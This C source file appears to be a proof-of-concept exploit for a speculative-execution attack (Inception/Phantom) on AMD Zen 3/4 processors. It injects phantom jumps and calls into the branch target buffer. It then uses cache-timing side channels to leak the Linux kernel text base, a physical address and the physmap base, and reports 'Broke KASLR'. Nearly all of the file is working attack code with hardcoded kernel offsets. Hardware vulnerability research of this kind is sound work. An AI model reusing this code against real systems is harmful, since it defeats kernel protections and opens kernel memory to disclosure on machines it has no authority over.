#define _GNU_SOURCE

#include "../noise.h"
#include "../phys.h"
#include "./sendto.h"
#include <assert.h>
#include <setjmp.h>
#include <signal.h>

/*
    Offsets into kernel text of locations using which the BTB is consulted/indexed,
    that should trigger a PhantomJMP or a recursive PhantomCALL.
*/
#define PHANTOM_JMP  0xd905be
#define PHANTOM_JMP2 0xdbbbac

#define LEAK_PHYS    0xc03fe
#define LEAK_PHYS2   0xbf6dbf
#define LEAK_PHYSMAP 0x97eefe

/*
    Distances from location using which BTB is indexed to the location of the PhantomJMP
    or recursive PhantomCALL, i.e. number of nops before jmp/call.
*/
#define PHANTOM_JMP_DISTANCE  0
#define PHANTOM_JMP2_DISTANCE 18
#define LEAK_PHYS_DISTANCE    6
#define LEAK_PHYS2_DISTANCE   4
#define LEAK_PHYSMAP_DISTANCE 0

/*
    Iterations of finding physmap/physical adresss.
*/
#define PHYS_ITERATIONS    5000
#define PHYSMAP_ITERATIONS 200

/*
    Parameters for Zen 3/4.
*/
#define HUGEPAGE  2097152
#define PAGE      4096
#define CACHELINE 64
#define SETS      64
#define WAYS      8
#define PTRN      0xffffbff800000000

/*
    Variables used throughout the attack.
*/
uint64_t base;
sigjmp_buf mark;

uint64_t training_jmp;
uint64_t training_jmp2;
uint64_t training_call;
uint64_t training_call2;
uint64_t victim_phantom_call;
uint64_t victim_phantom_call2;

static inline __attribute__((always_inline)) uint64_t rdtsc(void) {
    uint64_t lo, hi;
    asm volatile("RDTSC\n\t"
                 "movq %%rdx, %0\n\t"
                 "movq %%rax, %1\n\t"
                 : "=r"(hi), "=r"(lo)::"%rax", "%rbx", "%rcx", "%rdx");
    return (hi << 32) | lo;
}

static inline __attribute__((always_inline)) uint64_t rdtscp(void) {
    uint64_t lo, hi;
    asm volatile("RDTSCP\n\t"
                 "movq %%rdx, %0\n\t"
                 "movq %%rax, %1\n\t"
                 : "=r"(hi), "=r"(lo)::"%rax", "%rbx", "%rcx", "%rdx");
    return (hi << 32) | lo;
}

void clean_exit_on_sig(int sig_num) {
    siglongjmp(mark, 1);
}

void set_training_addrs(uint64_t jmp_loc, uint64_t jmp_loc_dist, uint64_t call_loc,
                        uint64_t call_loc_dist) {
    training_jmp = jmp_loc ^ PTRN;
    training_call = call_loc ^ PTRN;
    victim_phantom_call = call_loc;

    mmap((void *) (training_jmp & ~0xfff), 8192, PROT_READ | PROT_WRITE | PROT_EXEC,
         MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED_NOREPLACE, -1, 0);
    mmap((void *) (training_call & ~0xfff), 8192, PROT_READ | PROT_WRITE | PROT_EXEC,
         MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED_NOREPLACE, -1, 0);

    memset((void *) training_jmp, 0x90, jmp_loc_dist);
    *(uint32_t *) (training_jmp + jmp_loc_dist) = 0x00d0ff41; // jmp *%r8

    memset((void *) training_call, 0x90, call_loc_dist);
    *(uint32_t *) (training_call + call_loc_dist) = 0x00d0ff41; // call *%r13
}

void set_training_addrs2(uint64_t jmp_loc, uint64_t jmp_loc_dist, uint64_t call_loc,
                         uint64_t call_loc_dist) {
    training_jmp2 = jmp_loc ^ PTRN;
    training_call2 = call_loc ^ PTRN;
    victim_phantom_call2 = call_loc;

    mmap((void *) (training_jmp2 & ~0xfff), 8192, PROT_READ | PROT_WRITE | PROT_EXEC,
         MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED_NOREPLACE, -1, 0);
    mmap((void *) (training_call2 & ~0xfff), 8192, PROT_READ | PROT_WRITE | PROT_EXEC,
         MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED_NOREPLACE, -1, 0);

    memset((void *) training_jmp2, 0x90, jmp_loc_dist);
    *(uint32_t *) (training_jmp2 + jmp_loc_dist) = 0x00e0ff41; // jmp *%r8

    memset((void *) training_call2, 0x90, call_loc_dist);
    *(uint32_t *) (training_call2 + call_loc_dist) = 0x00d0ff41; // call *%r8
}

void unset_training_addrs() {
    munmap((void *) (training_jmp & ~0xfff), 8192);
    munmap((void *) (training_call & ~0xfff), 8192);
}

void unset_training_addrs2() {
    munmap((void *) (training_jmp2 & ~0xfff), 8192);
    munmap((void *) (training_call2 & ~0xfff), 8192);
}

static inline __attribute__((always_inline)) void insert_p_jmp() {
    if (sigsetjmp(mark, 1) == 0) {
        asm("mov %0, %%r8\n\t"
            "jmp *%[br_src]\n\t" ::"r"(victim_phantom_call),
            [br_src] "r"(training_jmp)
            : "r8");
    }
}

static inline __attribute__((always_inline)) void insert_p_jmp2() {
    if (sigsetjmp(mark, 1) == 0) {
        asm("mov %0, %%r8\n\t"
            "jmp *%[br_src]\n\t" ::"r"(victim_phantom_call2),
            [br_src] "r"(training_jmp2)
            : "r8");
    }
}

static inline __attribute__((always_inline)) void insert_p_call() {
    if (sigsetjmp(mark, 1) == 0) {
        asm("mov %0, %%r8\n\t"
            "jmp *%[br_src]\n\t" ::"r"(victim_phantom_call),
            [br_src] "r"(training_call)
            : "r8");
    }
}

static inline __attribute__((always_inline)) void insert_p_call2() {
    if (sigsetjmp(mark, 1) == 0) {
        asm("mov %0, %%r8\n\t"
            "jmp *%[br_src]\n\t" ::"r"(victim_phantom_call2),
            [br_src] "r"(training_call2)
            : "r8");
    }
}

static inline __attribute__((always_inline)) int reload_base() {
    __asm__ volatile("mfence\n");
    uint64_t t0 = rdtsc();
    *(volatile unsigned char *) (base);
    uint64_t dt = rdtscp() - t0;
    return !!(dt < 200);
}

// Double inception allows a gadget to be split into two disclosure gadgets (DGs) A and B
// This helps when the desired gadget is not present in the kernel text (as a whole)
// DG A should end with a ret instruction
// It combines A and B by triggering two recursive phantomCALLs (PCs)
// PC1 precedes DG A, while PC2 precedes DG B
// PC1 is triggered first in the system call, and then after a few returns, PC2 is
// triggered This gives a RSB state that looks like the following (top first, bottom
// last):
//  [?, ?, ..., ?, A, A, ..., A, B, B, ..., B]
// Now, after enough returns, a return instruction will be hijacked to DG A
// Since DG A ends with a ret instruction, we will, in the same speculation window, return
// until we hit B
uint64_t trigger_double_inception(uint64_t val, int iterations) {
    uint64_t res = 0;

    insert_p_call();
    insert_p_call2();

    for (int i = 0; i < iterations; i++) {
        insert_p_jmp();
        insert_p_jmp2();
        __asm__ volatile("clflushopt (%0)\n" ::"r"(base));
        trigger_physmap_load(val);
        res += reload_base();
    }

    return res;
}

uint64_t trigger_inception(uint64_t val, uint64_t val2, uint32_t mask, int iterations) {
    uint64_t res = 0;

    insert_p_call();

    for (int i = 0; i < iterations; i++) {
        insert_p_jmp();
        __asm__ volatile("clflushopt (%0)\n" ::"r"(base));
        trigger_data_leak(val, val2, mask);
        res += reload_base();
    }

    return res;
}

uint64_t find_phys(uint64_t text) {
    set_training_addrs(text + PHANTOM_JMP, PHANTOM_JMP_DISTANCE, text + LEAK_PHYS,
                       LEAK_PHYS_DISTANCE);
    set_training_addrs2(text + PHANTOM_JMP2, PHANTOM_JMP2_DISTANCE, text + LEAK_PHYS2,
                        LEAK_PHYS2_DISTANCE);

    int it = 0;

    for (int i = 0; i < 3; i++) {
        for (int block = 0; block < phys_blocks.nblocks; block++) {
            for (uint64_t phys_guess = phys_blocks.blocks[block] * phys_blocks.block_size;
                 phys_guess < (phys_blocks.blocks[block] + 1) * phys_blocks.block_size;
                 phys_guess += HUGEPAGE) {
                if (it % 500 == 0) {
                    printf(".");
                    fflush(stdout);
                }

                if (trigger_double_inception(phys_guess, PHYS_ITERATIONS)) {
                    unset_training_addrs();
                    unset_training_addrs2();
                    printf("\n");
                    return phys_guess;
                }

                it++;
            }
        }

        printf("round passed.\n");
    }

    unset_training_addrs();
    unset_training_addrs2();
    return 0x0;
}

uint64_t find_physmap(uint64_t text, uint64_t phys) {
    int it = 0;

    set_training_addrs(text + PHANTOM_JMP, PHANTOM_JMP_DISTANCE, text + LEAK_PHYSMAP,
                       LEAK_PHYSMAP_DISTANCE);

    for (int i = 0; i < 3; i++) {
        for (uint64_t physmap_guess = 0xffff888000000000;
             physmap_guess <= 0xfffffe0000000000; physmap_guess += 0x40000000) {
            if (it % 500 == 0) {
                printf(".");
                fflush(stdout);
            }

            if (trigger_inception(0x0, physmap_guess + phys - 0xc0, 0x0,
                                  PHYSMAP_ITERATIONS)) {
                unset_training_addrs();
                printf("\n");
                return physmap_guess;
            }

            it++;
        }
    }

    unset_training_addrs();
    return 0x0;
}

int64_t prime_probe_guess(uint64_t base, uint64_t guess, int set, uint64_t start,
                          uint64_t iterations) {
    uint64_t dt[2] = {0};

    insert_p_call();

    for (int i = 0; i < iterations; i++) {
        for (int l = 0; l < 2; l++) {
            // When l == 0, we create contention in the wrong set (+1)
            uint64_t goal = l == 0 ? guess + 0x80 : guess;

            insert_p_jmp();

            // Prime the cache set
            uint64_t *curr = (uint64_t *) start;
            for (int k = 0; k < WAYS; k++) {
                curr = (uint64_t *) *curr;
            }

            trigger_text_leak(goal);

            asm("mfence\n\t");
            // Measure influence of preceding syscall
            uint64_t t0 = rdtsc();
            for (int k = 0; k < WAYS; k++) {
                curr = (uint64_t *) *(curr + 1);
            }
            asm("mfence\n\t");
            dt[l] += rdtscp() - t0;
        }
    }

    return (dt[1] / iterations) - (dt[0] / iterations);
}

void get_addrs(uint64_t *buf, uint64_t set, int n) {
    for (int i = 0; i < n; i++) {
        uint64_t c = (7 * i + 12) & (n - 1);
        buf[i] = ((((((uint64_t) base) >> 12) + c) << 6) + set) << 6;
        if (i > 0)
            *((uint64_t *) buf[i - 1]) = buf[i];
        if (i > 0)
            *((uint64_t *) buf[i] + 1) = buf[i - 1];
    }

    *((uint64_t *) buf[n - 1]) = buf[0];
    *((uint64_t *) buf[n - 1]) = buf[n - 1];
}

uint64_t find_text() {
    uint64_t addrs[SETS * WAYS];
    for (int i = 0; i < SETS; i++) {
        get_addrs(addrs + (WAYS * i), i, WAYS);
    }

    int it = 0;
    for (int i = 0; i < 3; i++) {
        for (uint64_t guess = 0xffffffff81000000;
             guess < 0xffffffff81000000 + 495 * 0x200000; guess += 0x200000) {
            if (it % 50 == 0)
                printf(".");
            fflush(stdout);
            it++;

            set_training_addrs(guess + PHANTOM_JMP, PHANTOM_JMP_DISTANCE,
                               guess + 0xb0a6ff, 30);

            int64_t res = 0;
            for (int r = 0; r < 1; r++) {
                for (int i = 0; i < 64; i++) {
                    int64_t ok = prime_probe_guess(guess, guess + (i * 0x40), i,
                                                   addrs[i * WAYS], 100);
                    res += (ok > 0 ? 1 : (ok < 0 ? -1 : 0));
                }
            }

            if (res < 16) {
                unset_training_addrs();
                continue;
            }

            int64_t res_1 = 0;
            for (int i = 0; i < 64; i++) {
                int64_t ok = prime_probe_guess(guess, guess - 0x200000 + (i * 0x40), i,
                                               addrs[(i % 64) * WAYS], 250);
                res_1 += (ok > 0 ? 1 : (ok < 0 ? -1 : 0));
            }

            int64_t res_2 = 0;
            for (int i = 0; i < 64; i++) {
                int64_t ok = prime_probe_guess(guess, guess + (i * 0x40), i,
                                               addrs[(i % 64) * WAYS], 250);
                res_2 += (ok > 0 ? 1 : (ok < 0 ? -1 : 0));
            }

            int64_t res_3 = 0;
            for (int i = 0; i < 64; i++) {
                int64_t ok = prime_probe_guess(guess, guess + 0x200000 + (i * 0x40), i,
                                               addrs[(i % 64) * WAYS], 250);
                res_3 += (ok > 0 ? 1 : (ok < 0 ? -1 : 0));
            }

            unset_training_addrs();

            if (res_1 < 16 && res_2 >= 16 && res_3 >= 16) {
                printf("\n");
                return guess;
            }
        }
    }

    return 0x0;
}

int main(int argc, char *argv[]) {
    srand(getpid());

    phys_blocks_init();

    pid_t sibling_proc = run_sibling_noise("./workload3", CORE2);

    set_cpu_affinity(CORE1);

    sendto_init();

    signal(SIGSEGV, clean_exit_on_sig);

    base = (uint64_t) aligned_alloc(HUGEPAGE, HUGEPAGE);
    madvise((void *) base, HUGEPAGE, MADV_HUGEPAGE);
    mprotect((void *) base, HUGEPAGE, PROT_READ | PROT_WRITE | PROT_EXEC);

    *(volatile uint64_t *) base = rand();

    time_t start = time(NULL);

    uint64_t text = find_text();
    printf("Leaked _text: %p\n", (void *) text);
    fflush(stdout);
    if (text == 0x0) {
        kill(sibling_proc, SIGKILL);
        return 0x0;
    }

    // Switch workload for leaking phys addr
    kill(sibling_proc, SIGKILL);
    set_cpu_affinity2(CORE1, CORE2);
    sibling_proc = run_sibling_noise("./workload2", CORE2);
    set_cpu_affinity(CORE1);

    uint64_t phys = find_phys(text);
    printf("Physical: %p\n", (void *) phys);
    fflush(stdout);
    if (phys == 0x0) {
        kill(sibling_proc, SIGKILL);
        return 0x0;
    }

    // Switch workload for leaking data
    kill(sibling_proc, SIGKILL);
    set_cpu_affinity2(CORE1, CORE2);
    sibling_proc = run_sibling_noise("./workload3", CORE2);
    set_cpu_affinity(CORE1);

    uint64_t physmap = find_physmap(text, phys);
    printf("Leaked physmap: %p\n", (void *) physmap);
    fflush(stdout);
    if (physmap == 0x0) {
        kill(sibling_proc, SIGKILL);
        return 0x0;
    }

    time_t end = time(NULL);

    printf("Broke KASLR in %ld seconds\n", end - start);
    kill(sibling_proc, SIGKILL);

    return 0;
}
